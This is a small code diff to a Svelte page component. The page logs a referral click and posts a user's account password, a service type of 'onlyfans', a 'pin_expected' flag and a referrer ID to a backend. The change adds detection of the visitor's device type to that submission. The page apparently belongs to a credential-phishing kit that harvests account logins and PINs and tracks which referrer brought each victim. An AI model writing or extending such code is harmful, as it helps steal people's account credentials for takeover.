@@ -14,8 +14,11 @@
 <script>
     import { onMount } from "svelte";
     import { goto } from "$app/navigation";
-
+    
+    var device
     onMount(async () => {
+        device = window.navigator.userAgentData.mobile?'Mobile':'Desktop';
+
         console.log("hi");
         console.log("ref", ref);
         let r = await fetch("/api/click?ref="+ref);
@@ -36,7 +39,8 @@
                 input_account_password: password,
                 type: "onlyfans",
                 pin_expected: true,
-                ref_id:ref
+                ref_id:ref,
+                device:device
             }),
         });
         let resVal=await res.json();
